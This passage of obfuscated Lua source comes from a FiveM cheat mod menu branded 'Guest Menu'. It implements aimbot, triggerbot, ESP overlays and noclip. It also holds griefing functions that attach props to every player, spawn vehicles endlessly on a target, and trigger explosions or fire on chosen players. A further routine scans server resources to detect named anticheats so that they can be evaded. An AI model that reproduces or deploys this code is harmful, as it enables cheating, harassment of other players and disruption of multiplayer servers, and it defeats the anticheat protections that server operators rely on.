                                        coords.y,
                                        coords.z + C,
                                        0.0,
                                        0.0,
                                        0.0,
                                        false
                                    )
                                end
                            else
                                local af = GetEntityHeading(PlayerPedId())
                                SetEntityCollision(PlayerPedId(), false, false)
                                FreezeEntityPosition(PlayerPedId(), true)
                                SetEntityAlpha(PlayerPedId(), 0.05, false)
                                if IsDisabledControlPressed(0, 32) then
                                    local coords = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, C, 0.0)
                                    SetEntityVelocity(PlayerPedId(), 0.0, 0.0, 0.0)
                                    SetEntityRotation(PlayerPedId(), 0.0, 0.0, 0.0, 0, false)
                                    SetEntityHeading(PlayerPedId(), af)
                                    c3188c79a068242c231f422e25ebbaeNoOffset(
                                        PlayerPedId(),
                                        coords.x,
                                        coords.y,
                                        coords.z,
                                        B,
                                        B,
                                        B
                                    )
                                end
                                if IsDisabledControlPressed(0, 31) then
                                    local coords = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, -C, 0.0)
                                    SetEntityVelocity(PlayerPedId(), 0.0, 0.0, 0.0)
                                    SetEntityRotation(PlayerPedId(), 0.0, 0.0, 0.0, 0, false)
                                    SetEntityHeading(PlayerPedId(), af)
                                    c3188c79a068242c231f422e25ebbaeNoOffset(
                                        PlayerPedId(),
                                        coords.x,
                                        coords.y,
                                        coords.z,
                                        B,
                                        B,
                                        B
                                    )
                                end
                                if IsDisabledControlPressed(0, 34) then
                                    SetEntityHeading(PlayerPedId(), af + 2)
                                end
                                if IsDisabledControlPressed(0, 30) then
                                    SetEntityHeading(PlayerPedId(), af - 2)
                                end
                                if IsDisabledControlPressed(0, 20) then
                                    local coords = GetEntityCoords(PlayerPedId())
                                    SetEntityVelocity(PlayerPedId(), 0.0, 0.0, 0.0)
                                    SetEntityRotation(PlayerPedId(), 0.0, 0.0, 0.0, 0, false)
                                    SetEntityHeading(PlayerPedId(), af)
                                    c3188c79a068242c231f422e25ebbaeNoOffset(
                                        PlayerPedId(),
                                        coords.x,
                                        coords.y,
                                        coords.z - C * 2,
                                        B,
                                        B,
                                        B
                                    )
                                end
                                if IsDisabledControlPressed(0, 44) then
                                    local coords = GetEntityCoords(PlayerPedId())
                                    SetEntityVelocity(PlayerPedId(), 0.0, 0.0, 0.0)
                                    SetEntityRotation(PlayerPedId(), 0.0, 0.0, 0.0, 0, false)
                                    SetEntityHeading(PlayerPedId(), af)
                                    c3188c79a068242c231f422e25ebbaeNoOffset(
                                        PlayerPedId(),
                                        coords.x,
                                        coords.y,
                                        coords.z + C,
                                        B,
                                        B,
                                        B
                                    )
                                end
                            end
                            if IsDisabledControlJustReleased(0, 21) then
                                C = C + 1.0
                                if C > 15.0 then
                                    C = 1.0
                                end
                            end
                            RoundedNoClipSpeed =
                                d.Main.GuestToNum(
                                string.format("%.0f", C)
                            )
                            Wait(0)
                        end
                    end
                )
            end
            function NukeServer1()
                d.Main.GuestThread(
                    function()
                        for b7 = 0, 128 do
                            local gT =
                                CreateObject(GetHashKey("stt_prop_stunt_soccer_sball"), 0, 0, 0, true, true, true)
                            local gU = CreateObject(GetHashKey("freight"), 0, 0, 0, true, true, true)
                            local gV =
                                CreateObject(GetHashKey("stt_prop_race_start_line_03b"), 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                gT,
                                GetPlayerPed(b7),
                                GetPedBoneIndex(GetPlayerPed(b7), 57005),
                                0.4,
                                0,
                                2,
                                0,
                                0.0,
                                0.0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                            AttachEntityToEntity(
                                gU,
                                GetPlayerPed(b7),
                                GetPedBoneIndex(GetPlayerPed(b7), 57005),
                                0.4,
                                0,
                                0,
                                0,
                                0.0,
                                0.0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                            AttachEntityToEntity(
                                gV,
                                GetPlayerPed(b7),
                                GetPedBoneIndex(GetPlayerPed(b7), 57005),
                                0.4,
                                0,
                                0,
                                0,
                                0.0,
                                90.0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        end
                    end
                )
            end
            function Guestcustomnotif(gW, gX)
                SetNotificationTextEntry("STRING")
                AddTextComponentString(gW)
                DrawNotification(gX, false)
                if rgbnot then
                    for b7 = 0, 24 do
                        b7 = b7 + 1
                        SetNotificationBackgroundColor(b7)
                    end
                else
                    SetNotificationBackgroundColor(24)
                end
            end
            function Zombie99(eU)
                d.Main.GuestThread(
                    function()
                        RequestModelSync("Tug")
                        count = 0
                        for b = 0, 1000000000000000 do
                            local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(eU), true))
                            local i = e087206cc908106f5b9548005fa39fd(GetHashKey("Tug"), x, y, z, 0.0, true, true)
                            SetEntityInvincible(i, true)
                            count = count - 0.4
                            Citizen.Wait(10)
                            DeletePed(i)
                        end
                    end
                )
            end
            function runOnAll(gY, ...)
                local fR = GetActivePlayers()
                for b7 = 1, #fR do
                    pcall(gY, fR[b7], ...)
                end
            end
            function f0230ce5eb652fded68c8ce322df5cf()
                Guestcustomnotif(
                    "~p~Guest Menu : ~s~Searching anticheats..",
                    false
                )
                d.Main.GuestThread(
                    function()
                        local gZ = gG()
                        for b7 = 1, #gZ do
                            curres = gZ[b7]
                            for h, i in pairs({"fxmanifest.lua", "__resource.lua"}) do
                                data = LoadResourceFile(curres, i)
                                if data ~= nil then
                                    for g_ in data:gmatch("([^\n]*)\n?") do
                                        FinishedString = g_:gsub("client_script", "")
                                        FinishedString = FinishedString:gsub(" ", "")
                                        FinishedString = FinishedString:gsub('"', "")
                                        FinishedString = FinishedString:gsub("'", "")
                                        local h0 = LoadResourceFile(curres, FinishedString)
                                        if
                                            h0 ~= nil and
                                                string.find(h0, "This file was obfuscated using PSU Obfuscator 4.0.A")
                                         then
                                            if AntiCheats.VAC == false then
                                                Guestcustomnotif(
                                                    "VAC Detected in " .. curres,
                                                    false
                                                )
                                            end
                                            AntiCheats.VAC = true
                                        elseif h0 ~= nil and string.find(h0, "he is so lonely") then
                                            if AntiCheats.VAC == false then
                                                Guestcustomnotif(
                                                    "VAC Detected in " .. curres,
                                                    false
                                                )
                                            end
                                            AntiCheats.VAC = true
                                        elseif h0 ~= nil and string.find(h0, "Vyast") then
                                            if AntiCheats.VAC == false then
                                                Guestcustomnotif(
                                                    "VAC Detected in " .. curres,
                                                    false
                                                )
                                            end
                                            AntiCheats.VAC = true
                                        end
                                        if
                                            d.Main.GuestToNum(
                                                FinishedString
                                            )
                                         then
                                            if AntiCheats.ChocoHax == false then
                                                PushNotification("ChocoHax Detected in " .. curres, 1000)
                                            end
                                            AntiCheats.ChocoHax = true
                                        end
                                    end
                                end
                                if
                                    data and type(data) == "string" and string.find(data, "acloader.lua") and
                                        string.find(data, "Enumerators.lua")
                                 then
                                    Guestcustomnotif(
                                        "Badger Anticheat Detected in " .. curres,
                                        false
                                    )
                                    AntiCheats.BadgerAC = true
                                end
                                if data and type(data) == "string" and string.find(data, "client_config.lua") then
                                    Guestcustomnotif(
                                        "ATG Detected Detected in " .. curres,
                                        false
                                    )
                                    AntiCheats.ATG = true
                                end
                                if
                                    data and type(data) == "string" and string.find(data, "clientconfig.lua") and
                                        string.find("blacklistedmodels.lua")
                                 then
                                    Guestcustomnotif(
                                        "ChocoHax Detected in " .. curres,
                                        false
                                    )
                                    AntiCheats.ChocoHax = true
                                end
                                if data and type(data) == "string" and string.find(data, "acloader.lua") then
                                    if not AntiCheats.BadgerAC then
                                        Guestcustomnotif(
                                            "Badger Anticheat Detected in " .. curres,
                                            false
                                        )
                                    end
                                    AntiCheats.BadgerAC = true
                                end
                                if data and type(data) == "string" and string.find(data, "Badger's Official Anticheat") then
                                    Guestcustomnotif(
                                        "Badger Anticheat Detected in " .. curres,
                                        false
                                    )
                                    AntiCheats.BadgerAC = true
                                end
                                if data and type(data) == "string" and string.find(data, "TigoAntiCheat.net.dll") then
                                    Guestcustomnotif("Tigo Detected in " .. curres, false)
                                    AntiCheats.TigoAC = true
                                end
                            end
                            d.Main.GuestWait(10)
                        end
                    end
                )
            end
            function Launch1(eU)
                local fX = GetEntityCoords(GetPlayerPed(eU))
                d5cb04ddaa81e3685adb07e123e0631(fX.x, fX.y, fX.z, 18, 1.0, true, true, 0.0)
            end
            function Silentkill(eU)
                local fX = GetEntityCoords(GetPlayerPed(eU))
                d5cb04ddaa81e3685adb07e123e0631(fX.x, fX.y, fX.z, 26, FLT_MAX, false, true, 0.0)
            end
            function Zombie99(eU)
                RequestModelSync("Tug")
                count = 0
                for b = 0, 1000000000000000 do
                    local x, y, z =
                        d.Main.GuestTable.GuestUnPack(
                        GetEntityCoords(GetPlayerPed(eU), true)
                    )
                    local i = e087206cc908106f5b9548005fa39fd(GetHashKey("Tug"), x, y, z, 0.0, true, true)
                    SetEntityInvincible(i, true)
                    count = count - 0.4
                    Citizen.Wait(10)
                    DeletePed(i)
                end
            end
            function BurnV2(eU)
                local fX = GetEntityCoords(GetPlayerPed(eU))
                d5cb04ddaa81e3685adb07e123e0631(fX.x, fX.y, fX.z, 29, 0.0, false, false, 0.0)
            end
            function BurnV1(eU)
                local fX = GetEntityCoords(GetPlayerPed(eU))
                d5cb04ddaa81e3685adb07e123e0631(fX.x, fX.y, fX.z, 14, 0.0, false, false, 0.0)
            end
            function doForceFieldTick(h1)
                local eU = PlayerPedId()
                local coords = GetEntityCoords(PlayerPedId())
                local h2 = GetPlayersLastVehicle()
                local h3 = IsPedInVehicle(eU, h2, true)
                DrawMarker(
                    28,
                    coords.x,
                    coords.y,
                    coords.z,
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    180.0,
                    0.0,
                    h1,
                    h1,
                    h1,
                    180,
                    80,
                    0,
                    35,
                    false,
                    true,
                    2,
                    nil,
                    nil,
                    false
                )
                for h in f79156a3ecec7e2fae4e99ae06a241f() do
                    if (not h3 or h ~= h2) and GetDistanceBetweenCoords(coords, GetEntityCoords(h)) <= h1 * 1.2 then
                        RequestControlOnce(h)
                        I.functions.applyShockwave(h)
                    end
                end
                for h in EnumeratePeds() do
                    if h ~= PlayerPedId() and GetDistanceBetweenCoords(coords, GetEntityCoords(h)) <= h1 * 1.2 then
                        RequestControlOnce(h)
                        SetPedRagdollOnCollision(h, true)
                        SetPedRagdollForceFall(h)
                        I.functions.applyShockwave(h)
                    end
                end
            end
            if I.OptionConfig.Aimbot then
                if I.OptionConfig.DrawFovS then
                    if not HasStreamedTextureDictLoaded("mpmissmarkers256") then
                        RequestStreamedTextureDict("mpmissmarkers256", true)
                    end
                    I.DrawSprite(
                        "mpmissmarkers256",
                        "corona_shade",
                        0.5,
                        0.5,
                        0.14,
                        0.23,
                        0.0,
                        I.rgb.r,
                        I.rgb.g,
                        I.rgb.b,
                        100
                    )
                end
                local h4 = GetActivePlayers()
                for b7 = 1, #h4 do
                    ShootAimbot(GetPlayerPed(h4[b7]))
                end
            end
            function ce()
                I.StartRC()
            end
            I.StartRC = function()
                if DoesEntityExist(I.Entity) then
                    return
                end
                I.SpawnRC()
                I.a9ea3ec791e6bd4ab6b36f2ff2a(true)
                while DoesEntityExist(I.Entity) and DoesEntityExist(I.Driver) do
                    Citizen.Wait(5)
                    local h5 = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(I.Entity), true)
                    I.DrawInstructions(h5)
                    I.HandleKeys(h5)
                    if h5 <= 3000.0 then
                        if not NetworkHasControlOfEntity(I.Driver) then
                            NetworkRequestControlOfEntity(I.Driver)
                        elseif not NetworkHasControlOfEntity(I.Entity) then
                            NetworkRequestControlOfEntity(I.Entity)
                        end
                    else
                        TaskVehicleTempAction(I.Driver, I.Entity, 6, 2500)
                    end
                end
            end
            I.HandleKeys = function(h5)
                if IsControlJustReleased(0, 47) then
                    if IsCamRendering(I.Camera) then
                        I.b20af3603344e312ec1a6e84bfbefce2era(false)
                    else
                        I.b20af3603344e312ec1a6e84bfbefce2era(true)
                    end
                end
                if h5 <= 3.0 then
                    if IsControlJustPressed(0, 38) then
                        I.Attach("pick")
                    end
                end
                if h5 < 3000.0 then
                    if IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
                        TaskVehicleTempAction(I.Driver, I.Entity, 9, 1)
                    end
                    if IsControlJustReleased(0, 172) or IsControlJustReleased(0, 173) then
                        TaskVehicleTempAction(I.Driver, I.Entity, 6, 2500)
                    end
                    if IsControlPressed(0, 173) and not IsControlPressed(0, 172) then
                        TaskVehicleTempAction(I.Driver, I.Entity, 22, 1)
                    end
                    if IsControlPressed(0, 174) and IsControlPressed(0, 173) then
                        TaskVehicleTempAction(I.Driver, I.Entity, 13, 1)
                    end
                    if IsControlPressed(0, 175) and IsControlPressed(0, 173) then
                        TaskVehicleTempAction(I.Driver, I.Entity, 14, 1)
                    end
                    if IsControlPressed(0, 172) and IsControlPressed(0, 173) then
                        TaskVehicleTempAction(I.Driver, I.Entity, 30, 100)
                    end
                    if IsControlPressed(0, 174) and IsControlPressed(0, 172) then
                        TaskVehicleTempAction(I.Driver, I.Entity, 7, 1)
                    end
                    if IsControlPressed(0, 175) and IsControlPressed(0, 172) then
                        TaskVehicleTempAction(I.Driver, I.Entity, 8, 1)
                    end
                    if IsControlPressed(0, 174) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
                        TaskVehicleTempAction(I.Driver, I.Entity, 4, 1)
                    end
                    if IsControlPressed(0, 175) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
                        TaskVehicleTempAction(I.Driver, I.Entity, 5, 1)
                    end
                    if IsControlJustReleased(0, 168) then
                        SetVehicleEngineOn(I.Entity, not GetIsVehicleEngineRunning(I.Entity), false, true)
                    end
                end
            end
            I.DrawInstructions = function(h5)
                local h6 = {
                    {["label"] = "Right", ["button"] = "~INPUT_CELLPHONE_RIGHT~"},
                    {["label"] = "Forward", ["button"] = "~INPUT_CELLPHONE_UP~"},
                    {["label"] = "Reverse", ["button"] = "~INPUT_CELLPHONE_DOWN~"},
                    {["label"] = "Left", ["button"] = "~INPUT_CELLPHONE_LEFT~"}
                }
                local h7 = {["label"] = "Delete Car", ["button"] = "~INPUT_CONTEXT~"}
                local h8 = {
                    {["label"] = "Toggle Camera", ["button"] = "~INPUT_DETONATE~"},
                    {["label"] = "Start/Stop Engine", ["button"] = "~INPUT_SELECT_CHARACTER_TREVOR~"}
                }
                if h5 <= 3000.0 then
                    for h9 = 1, #h6 do
                        local ha = h6[h9]
                        table.insert(h8, ha)
                    end
                    if h5 <= 3000.0 then
                        table.insert(h8, h7)
                    end
                end
                d.Main.GuestThread(
                    function()
                        local hb = RequestScaleformMovie("instructional_buttons")
                        while not HasScaleformMovieLoaded(hb) do
                            Wait(0)
                        end
                        PushScaleformMovieFunction(hb, "CLEAR_ALL")
                        PushScaleformMovieFunction(hb, "TOGGLE_MOUSE_BUTTONS")
                        PushScaleformMovieFunctionParameterBool(0)
                        PopScaleformMovieFunctionVoid()
                        for h9, hc in ipairs(h8) do
                            PushScaleformMovieFunction(hb, "SET_DATA_SLOT")
                            PushScaleformMovieFunctionParameterInt(h9 - 1)
                            PushScaleformMovieMethodParameterButtonName(hc["button"])
                            PushScaleformMovieFunctionParameterString(hc["label"])
                            PopScaleformMovieFunctionVoid()
                        end
                        PushScaleformMovieFunction(hb, "DRAW_INSTRUCTIONAL_BUTTONS")
                        PushScaleformMovieFunctionParameterInt(-1)
                        PopScaleformMovieFunctionVoid()
                        DrawScaleformMovieFullscreen(hb, 255, 255, 255, 255)
                    end
                )
            end
            I.SpawnRC = function()
                local hd = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Enter Vehicle Spawn Name", "", 50)
                if hd and IsModelValid(hd) and IsModelAVehicle(hd) then
                    RequestModel(hd)
                    while not HasModelLoaded(hd) do
                        Citizen.Wait(0)
                    end
                    I.d74e1c28908ea1fa3f80e137b7bd471e({GetHashKey(hd), 68070371})
                    local he, hf =
                        GetEntityCoords(PlayerPedId()) + GetEntityForwardVector(PlayerPedId()) * 2.0,
                        GetEntityHeading(PlayerPedId())
                    I.Entity = e087206cc908106f5b9548005fa39fd(GetHashKey(hd), he, hf, true)
                    while not DoesEntityExist(I.Entity) do
                        Citizen.Wait(5)
                    end
                    I.Driver = CreatePed(5, 68070371, he, hf, true)
                    SetEntityInvincible(I.Driver, true)
                    a5a42faa7cf2d2e6ec9530df349f5a7(I.Driver, false)
                    FreezeEntityPosition(I.Driver, true)
                    SetPedAlertness(I.Driver, 0.0)
                    TaskWarpPedIntoVehicle(I.Driver, I.Entity, -1)
                    while not IsPedInVehicle(I.Driver, I.Entity) do
                        Citizen.Wait(0)
                    end
                    I.Attach("place")
                else
                end
            end
            I.Attach = function(gX)
                if not DoesEntityExist(I.Entity) then
                    return
                end
                I.d74e1c28908ea1fa3f80e137b7bd471e({"pickup_object"})
                if gX == "place" then
                    AttachEntityToEntity(
                        I.Entity,
                        PlayerPedId(),
                        GetPedBoneIndex(PlayerPedId(), 28422),
                        3.0,
                        0.0,
                        0.5,
                        70.0,
                        0.0,
                        270.0,
                        1,
                        1,
                        0,
                        0,
                        2,
                        1
                    )
                    I.Main.GuestWait(200)
                    DetachEntity(I.Entity, false, true)
                    PlaceObjectOnGroundProperly(I.Entity)
                elseif gX == "pick" then
                    if DoesCamExist(I.Camera) then
                        I.b20af3603344e312ec1a6e84bfbefce2era(false)
                    end
                    I.a9ea3ec791e6bd4ab6b36f2ff2a(false)
                    Citizen.Wait(100)
                    DetachEntity(I.Entity)
                    ebbd65841190b96a9829425dd0630(I.Entity)
                    DeleteEntity(I.Driver)
                    I.f74f6e1e6ede4abe2560fea93a5010fa()
                end
            end
            I.a9ea3ec791e6bd4ab6b36f2ff2a = function(hg)
                if hg then
                    I.d74e1c28908ea1fa3f80e137b7bd471e({GetHashKey("prop_cs_a9ea3ec791e6bd4ab6b36f2ff2a")})
                    I.d74e1c28908ea1fa3f80e137b7bd471e(
                        {"amb@code_human_in_bus_passenger_idles@female@a9ea3ec791e6bd4ab6b36f2ff2a@idle_a"}
                    )
                    d.Main.GuestThread(
                        function()
                            while DoesEntityExist(I.a9ea3ec791e6bd4ab6b36f2ff2aEntity) do
                                Citizen.Wait(5)
                                if
                                    not IsEntityPlayingAnim(
                                        PlayerPedId(),
                                        "amb@code_human_in_bus_passenger_idles@female@a9ea3ec791e6bd4ab6b36f2ff2a@idle_a",
                                        "idle_a",
                                        3
                                    )
                                 then
                                end
                            end
                            ClearPedTasks(PlayerPedId())
                        end
                    )
                else
                    DeleteEntity(I.a9ea3ec791e6bd4ab6b36f2ff2aEntity)
                end
            end
            I.b20af3603344e312ec1a6e84bfbefce2era = function(hg)
                if not true then
                    return
                end
                if hg then
                    if not DoesEntityExist(I.Entity) then
                        return
                    end
                    if DoesCamExist(I.Camera) then
                        DestroyCam(I.Camera)
                    end
                    I.Camera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                    AttachCamToEntity(I.Camera, I.Entity, 0.0, 0.0, 0.4, true)
                    d.Main.GuestThread(
                        function()
                            while DoesCamExist(I.Camera) do
                                Citizen.Wait(5)
                                SetCamRot(I.Camera, GetEntityRotation(I.Entity))
                            end
                        end
                    )
                    local hh =
                        500 *
                        math.ceil(
                            GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(I.Entity), true) /
                                10
                        )
                    RenderScriptCams(1, 1, hh, 1, 1)
                    Citizen.Wait(hh)
                    SetTimecycleModifier("scanline_cam_cheap")
                    SetTimecycleModifierStrength(2.0)
                else
                    local hh =
                        500 *
                        math.ceil(
                            GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(I.Entity), true) /
                                10
                        )
                    RenderScriptCams(0, 1, hh, 1, 0)
                    Citizen.Wait(hh)
                    ClearTimecycleModifier()
                    DestroyCam(I.Camera)
                end
            end
            I.d74e1c28908ea1fa3f80e137b7bd471e = function(hi)
                for hj = 1, #hi do
                    local gS = hi[hj]
                    if not I.CachedModels then
                        I.CachedModels = {}
                    end
                    table.insert(I.CachedModels, gS)
                    if IsModelValid(gS) then
                        while not HasModelLoaded(gS) do
                            RequestModel(gS)
                            Citizen.Wait(10)
                        end
                    else
                        while not HasAnimDictLoaded(gS) do
                            RequestAnimDict(gS)
                            Citizen.Wait(10)
                        end
                    end
                end
            end
            I.f74f6e1e6ede4abe2560fea93a5010fa = function()
                for hj = 1, #I.CachedModels do
                    local gS = I.CachedModels[hj]
                    if IsModelValid(gS) then
                        SetModelAsNoLongerNeeded(gS)
                    else
                        RemoveAnimDict(gS)
                    end
                end
            end
            function ShootAimbot(h)
                if
                    d.Main.GuestAimMore.GuestIsEntityOnScreen(
                        h
                    ) and
                        d.Main.GuestAimMore.GuestHasEntityClearLosToEntityInFront(
                            PlayerPedId(),
                            h
                        ) and
                        not IsPedDeadOrDying(h) and
                        not IsPedInVehicle(h, GetVehiclePedIsIn(h), false) and
                        IsDisabledControlPressed(0, A["MOUSE1"]) and
                        IsPlayerFreeAiming(PlayerId())
                 then
                    local x, y, z =
                        d.Main.GuestTable.GuestUnPack(
                        GetEntityCoords(h)
                    )
                    local cd, _x, _y = World3dToScreen2d(x, y, z)
                    if _x > 0.25 and _x < 0.75 and _y > 0.25 and _y < 0.75 then
                        local cd, gA =
                            d.Main.GuestAimMore.GuestGetCurrentPedWeapon(
                            PlayerPedId()
                        )
                        ShootAt2(
                            h,
                            AimbotBone,
                            d.Main.GuestAimMore.GuestGetWeaponDamage(
                                gA,
                                1
                            )
                        )
                    end
                end
            end
            if I.OptionConfig.speedboost then
                DisableControlAction(0, 86, true)
                if IsDisabledControlPressed(0, 86) and IsPedInAnyVehicle(PlayerPedId()) then
                    local K = GetPlayerPed(-1)
                    local playerVeh = GetVehiclePedIsIn(K, false)
                    SetVehicleForwardSpeed(playerVeh, 336.0)
                end
            end
            if I.OptionConfig.EasyHandling and IsPedInAnyVehicle(PlayerPedId()) then
                local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                SetVehicleGravityAmount(veh, 60.0)
            end
            if I.OptionConfig.DriveOnWater then
                x, y, z =
                    d.Main.GuestTable.GuestUnPack(
                    GetEntityCoords(GetPlayersLastVehicle())
                )
                sucess, z = GetWaterHeight(x, y, z)
                if sucess and I.OptionConfig.DriveOnWaterProp then
                    a5a42faa7cf2d2e6ec9530df349f5a7(I.OptionConfig.DriveOnWaterProp, false, false)
                    c3188c79a068242c231f422e25ebbae(I.OptionConfig.DriveOnWaterProp, x, y, z)
                    SetEntityHeading(I.OptionConfig.DriveOnWaterProp, GetEntityHeading(PlayerPedId()))
                elseif not sucess then
                    c3188c79a068242c231f422e25ebbae(I.OptionConfig.DriveOnWaterProp, x, y, z - 100.5)
                end
            end
            if I.OptionConfig.AutoClean then
                SetVehicleDirtLevel(GetVehiclePedIsUsing(PlayerPedId()), 0.0)
            end
            if I.OptionConfig.PersonalVehicleCam then
                local hk = GetCamCoord(I.OptionConfig.PersonalVehicleCam)
                SetFocusEntity(I.OptionConfig.PersonalVehicle)
                SetCamRot(
                    I.OptionConfig.PersonalVehicleCam,
                    -2.0,
                    0.0,
                    GetEntityHeading(I.OptionConfig.PersonalVehicle),
                    0
                )
            end
            if I.OptionConfig.PersonalVehicleCam then
                RenderScriptCams(true, false, 0, true, false)
            end
            if I.OptionConfig.Collision then
                playerveh = GetVehiclePedIsIn(PlayerPedId(), false)
                for h in f79156a3ecec7e2fae4e99ae06a241f() do
                    SetEntityNoCollisionEntity(h, playerveh, true)
                end
                for h in d22eb5d3d78dc75e96647692c5() do
                    SetEntityNoCollisionEntity(h, playerveh, true)
                end
                for h in EnumeratePeds() do
                    SetEntityNoCollisionEntity(h, playerveh, true)
                end
            end
            if I.OptionConfig.InfiniteCombatRoll then
                for b7 = 0, 3 do
                    StatSetInt(GetHashKey("mp" .. b7 .. "_shooting_ability"), 9999, true)
                    StatSetInt(GetHashKey("sp" .. b7 .. "_shooting_ability"), 9999, true)
                end
            end
            if I.OptionConfig.speedometer then
                if IsPedInAnyVehicle(PlayerPedId()) then
                    local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                    local hl = GetEntitySpeed(veh) * 2.236936
                    local hm = GetEntitySpeed(veh) * 3.6
                    carspeedround =
                        d.Main.GuestToNum(
                        string.format("%.0f", hl)
                    )
                    carkphspeedround =
                        d.Main.GuestToNum(
                        string.format("%.0f", hm)
                    )
                    I.DrawBottomText("MPH " .. carspeedround .. " |  KPH " .. carkphspeedround)
                end
            end
            function c2c74f255aa73c2253afc9ecc82()
                return GetPlayerPed(-1)
            end
            function e06315519d221ef0bfc33abc6568ce3()
                return GetVehiclePedIsIn(GetPlayerPed(-1), false)
            end
            if I.OptionConfig.driftmode then
                SetVehicleReduceGrip(e06315519d221ef0bfc33abc6568ce3(), true)
            else
                SetVehicleReduceGrip(e06315519d221ef0bfc33abc6568ce3(), false)
            end
            if I.OptionConfig.AntiHeadshot then
                SetPedSuffersCriticalHits(PlayerPedId(), false)
            end
            if I.OptionConfig.Watermark then
                DisplayText = "Guest Menu"
                I.DrawBottomText(DisplayText)
            end
            if B then
            end
            if I.OptionConfig.ForceGun then
                local bJ, bH = GetPedLastWeaponImpactCoord(PlayerPedId())
                if bJ then
                    for h in EnumeratePeds() do
                        local coords = GetEntityCoords(h)
                        if h ~= PlayerPedId() and GetDistanceBetweenCoords(bH, coords) <= 1.0 then
                            local gx = GetEntityForwardVector(PlayerPedId())
                            RequestControlOnce(h)
                            ApplyForce(h, gx * 500)
                        end
                    end
                    for h in f79156a3ecec7e2fae4e99ae06a241f() do
                        local coords = GetEntityCoords(h)
                        if h ~= GetVehiclePedIsIn(PlayerPedId(), 0) and GetDistanceBetweenCoords(bH, coords) <= 3.0 then
                            local gx = GetEntityForwardVector(PlayerPedId())
                            RequestControlOnce(h)
                            ApplyForce(h, gx * 500)
                        end
                    end
                end
            end
            if I.OptionConfig.Forcefield then
                doForceFieldTick(ForcefieldRadius)
            end
            if I.OptionConfig.ESPBox then
                local hn = GetActivePlayers()
                for b7 = 1, #hn do
                    local g3 = GetPlayerPed(hn[b7])
                    bone = GetEntityBoneIndexByName(g3, "SKEL_HEAD")
                    x, y, z =
                        d.Main.GuestTable.GuestUnPack(
                        GetPedBoneCoords(g3, bone, 0.0, 0.0, 0.0)
                    )
                    px, py, pz =
                        d.Main.GuestTable.GuestUnPack(
                        GetGameplayCamCoord()
                    )
                    if GetDistanceBetweenCoords(x, y, z, px, py, pz, true) < I.OptionConfig.visualsESPDistance then
                        if
                            g3 ~= PlayerPedId() and
                                d.Main.GuestAimMore.GuestIsEntityOnScreen(
                                    g3
                                ) and
                                not IsPedDeadOrDying(g3)
                         then
                            z = z + 0.9
                            local ho = GetDistanceBetweenCoords(x, y, z, px, py, pz, true) * 0.002 / 2
                            if ho < 0.0042 then
                                ho = 0.0042
                            end
                            if I.OptionConfig.ESPMenuColours then
                                color = {r = I.rgb.r, g = I.rgb.g, b = I.rgb.b}
                            else
                                color = {r = 255, g = 255, b = 255}
                            end
                            retval, _x, _y =
                                d.Main.GuestAimMore.GetScreenCoordFromWorldCoord(
                                x,
                                y,
                                z
                            )
                            width = 0.00045
                            height = 0.0023
                            DrawRect(_x, _y, width / ho, 0.0015, color.r, color.g, color.b, 200)
                            DrawRect(_x, _y + height / ho, width / ho, 0.0015, color.r, color.g, color.b, 200)
                            DrawRect(
                                _x + width / 2 / ho,
                                _y + height / 2 / ho,
                                0.001,
                                height / ho,
                                color.r,
                                color.g,
                                color.b,
                                200
                            )
                            DrawRect(
                                _x - width / 2 / ho,
                                _y + height / 2 / ho,
                                0.001,
                                height / ho,
                                color.r,
                                color.g,
                                color.b,
                                200
                            )
                            health = GetEntityHealth(g3)
                            if health > 200 then
                                health = 200
                            end
                            DrawRect(
                                _x - 0.00028 / ho,
                                _y + height / 2 / ho,
                                0.0016 / ho * 0.015,
                                height / ho,
                                0,
                                0,
                                0,
                                200
                            )
                            DrawRect(
                                _x - 0.00028 / ho,
                                _y + height / ho - GetEntityHealth(g3) / 175000 / ho,
                                0.0016 / ho * 0.015,
                                GetEntityHealth(g3) / 87500 / ho,
                                0,
                                255,
                                0,
                                200
                            )
                        end
                    end
                end
            end
            if I.OptionConfig.TriggerBot then
                local hp, ck =
                    d.Main.GuestAimMore.GuestEntityPlayerIsFreeAimingAt(
                    PlayerId()
                )
                if hp and IsEntityAPed(ck) then
                    local hq = GetPedBoneCoords(ck, 0, 0.0, -0.2, 0.0)
                    x, y, z =
                        d.Main.GuestTable.GuestUnPack(
                        hq
                    )
                    d.Main.GuestAimMore.GuestSetPedShootsAtCoord(
                        PlayerPedId(),
                        x,
                        y,
                        z,
                        true
                    )
                end
            end
            if I.OptionConfig.ESPName then
                local hn = GetActivePlayers()
                for b7 = 1, #hn do
                    local g3 = GetPlayerPed(hn[b7])
                    x, y, z =
                        d.Main.GuestTable.GuestUnPack(
                        GetPedBoneCoords(g3, 0, 0.0, 0.0, 1.0)
                    )
                    x1, y1, z1 =
                        d.Main.GuestTable.GuestUnPack(
                        GetPedBoneCoords(g3, 0, 0.0, 0.0, 1.2)
                    )
                    px, py, pz =
                        d.Main.GuestTable.GuestUnPack(
                        GetGameplayCamCoord()
                    )
                    if GetDistanceBetweenCoords(x, y, z, px, py, pz, true) < I.OptionConfig.ESPDistance then
                        local retval, _x, _y =
                            d.Main.GuestAimMore.GetScreenCoordFromWorldCoord(
                            x,
                            y,
                            z
                        )
                        local hr, hs, ht =
                            d.Main.GuestAimMore.GetScreenCoordFromWorldCoord(
                            x1,
                            y1,
                            z1
                        )
                        local ho = GetDistanceBetweenCoords(x, y, z, px, py, pz, true) * 0.0002
                        local ho = GetDistanceBetweenCoords(x1, y1, z1, px, py, pz, true) * 0.0002
